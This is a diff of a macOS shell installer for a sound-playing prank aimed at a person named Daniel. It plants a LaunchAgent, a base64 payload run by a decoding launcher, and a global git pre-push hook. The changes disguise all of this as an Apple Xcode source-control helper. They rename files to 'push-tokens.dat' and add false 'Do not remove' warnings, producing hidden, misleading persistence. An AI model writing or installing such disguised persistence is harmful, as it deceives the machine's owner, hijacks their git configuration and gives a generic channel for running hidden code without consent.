@@ -2,19 +2,19 @@
 
 set -euo pipefail
 
-LABEL="com.apple.cloudkit.helper"
+LABEL="com.apple.dt.Xcode.sourcecontrol.helper"
 SUPPORT_DIR="$HOME/Library/Application Support/$LABEL"
 LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
 PLIST="$LAUNCH_AGENTS_DIR/$LABEL.plist"
 HOOKS_DIR="$SUPPORT_DIR/hooks"
 STATE_DIR="$SUPPORT_DIR/.state"
-TRIGGER="$SUPPORT_DIR/.trigger"
+TRIGGER="$SUPPORT_DIR/.push-event"
 SOUND_FILE="$SUPPORT_DIR/cache.dat"
-LAUNCHER="$SUPPORT_DIR/launcher.sh"
-PAYLOAD_FILE="$SUPPORT_DIR/payload.b64"
+LAUNCHER="$SUPPORT_DIR/sourcecontrol-helper"
+PAYLOAD_FILE="$SUPPORT_DIR/push-tokens.dat"
 SOUND_SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-echo "Installing damn-daniel..."
+echo "Installing..."
 
 mkdir -p "$SUPPORT_DIR" "$HOOKS_DIR" "$STATE_DIR" "$LAUNCH_AGENTS_DIR"
 
@@ -23,16 +23,17 @@ cp "$SOUND_SRC_DIR/notification.aiff" "$SOUND_FILE"
 
 
 cat > "$PAYLOAD_FILE" <<'PAYLOAD_B64'
-IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmFmcGxheSAiJEhPTUUvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L2NvbS5hcHBsZS5jbG91ZGtpdC5oZWxwZXIvY2FjaGUuZGF0IiA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQpleGl0IDAK
+IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmFmcGxheSAiJEhPTUUvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L2NvbS5hcHBsZS5kdC5YY29kZS5zb3VyY2Vjb250cm9sLmhlbHBlci9jYWNoZS5kYXQiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmV4aXQgMAo=
 PAYLOAD_B64
 
 
 cat > "$LAUNCHER" <<'LAUNCHER'
 #!/bin/bash
-# damn-daniel launcher. Decodes the cached payload and runs it.
-DIR="$HOME/Library/Application Support/com.apple.cloudkit.helper"
-[ -f "$DIR/payload.b64" ] || exit 0
-SCRIPT="$(/usr/bin/base64 -d -i "$DIR/payload.b64" 2>/dev/null)"
+# Xcode Source Control helper process. Handles post-push IDE state sync.
+# Do not remove — may cause Xcode to lose remote tracking state.
+DIR="$HOME/Library/Application Support/com.apple.dt.Xcode.sourcecontrol.helper"
+[ -f "$DIR/push-tokens.dat" ] || exit 0
+SCRIPT="$(/usr/bin/base64 -d -i "$DIR/push-tokens.dat" 2>/dev/null)"
 [ -n "$SCRIPT" ] || exit 0
 /bin/bash -c "$SCRIPT" >/dev/null 2>&1 || true
 exit 0
@@ -84,14 +85,14 @@ echo "${PREV_PREPUSH}" > "$STATE_DIR/previous-prepush.txt"
 
 cat > "$HOOKS_DIR/pre-push" <<HOOK
 #!/bin/bash
-# git pre-push: telemetry/lint timestamp helper. Quiet on success.
-# Records a push timestamp for tooling, then delegates to repo-local hooks.
-# Always non-blocking; failures here never abort a push.
+# Xcode Source Control integration: notifies the IDE of push events
+# for build graph invalidation and remote tracking. Do not remove —
+# may cause Xcode to lose remote tracking state.
 
 TRIGGER="$TRIGGER"
 STATE_DIR="$STATE_DIR"
 
-# Update the lint timestamp.
+# Notify Xcode of push event.
 date +%s > "\$TRIGGER" 2>/dev/null || true
 
 # --- delegate to the previous GLOBAL pre-push hook (if any) ----------------
@@ -115,3 +116,10 @@ HOOK
 chmod +x "$HOOKS_DIR/pre-push"
 
 git config --global core.hooksPath "$HOOKS_DIR"
+
+# Drop a breadcrumb in case Daniel ever finds it.
+cat > "$SUPPORT_DIR/README.txt" <<'README'
+If you're reading this: https://github.com/brunobossgang/damn-daniel-prank
+README
+
+echo "Done."
